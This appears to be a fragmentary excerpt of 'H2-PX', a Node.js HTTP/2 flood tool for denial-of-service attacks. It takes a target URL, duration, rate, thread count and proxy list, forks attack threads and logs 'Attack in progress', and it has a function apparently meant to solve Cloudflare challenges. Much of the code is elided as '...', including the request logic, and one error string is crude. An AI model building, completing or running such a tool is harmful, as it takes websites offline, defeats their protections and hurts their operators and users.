...
async function solveCloudflareChallenge(proxyAddr) {
 ...
 if (process.argv.length < 7){console.log(`H2-PX：\nnode H2-PX.js <url> <time> <rate> <threads> <proxyfile>`); process.exit();}
 const headers = {};
 ...
 const getCurrentTime = () => {
  ...
  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      ...
      console.log(`H2-PX：${getCurrentTime()} ：${getTitleFromHTML(data)}`);
    })
    .catch((error) => {
      if (error.message === 'sosi penis') {
        console.log(`H2-PX：${getCurrentTime()} started`);
      } else if (error.response) {
        const extractedTitle = getTitleFromHTML(error.response.data);
        console.log(`H2-PX：${getCurrentTime()} H2-PX：${extractedTitle} {error.response.status}`);
      } else {
        console.log(`H2-PX：${getCurrentTime()} ${error.message}`);
      }
    });
}
...
if (cluster.isMaster){
  console.clear();
  console.log(`Started Attack: ${getCurrentTime()}`)
  console.log(`------------------------------------------`)
  ...
  for (let i = 1; i <= process.argv[5]; i++){
    cluster.fork();
    console.log(`H2-PX：${getCurrentTime()} Attack thread ${i} started`);
  }
  console.log(`H2-PX：${getCurrentTime()} Attack in progress`);
  setInterval(getStatus, 2000);
  setTimeout(() => {
    console.log(`H2-PX：${getCurrentTime()}  The attack is over`);
    process.exit(1);
  }, process.argv[3] * 1000);
} 
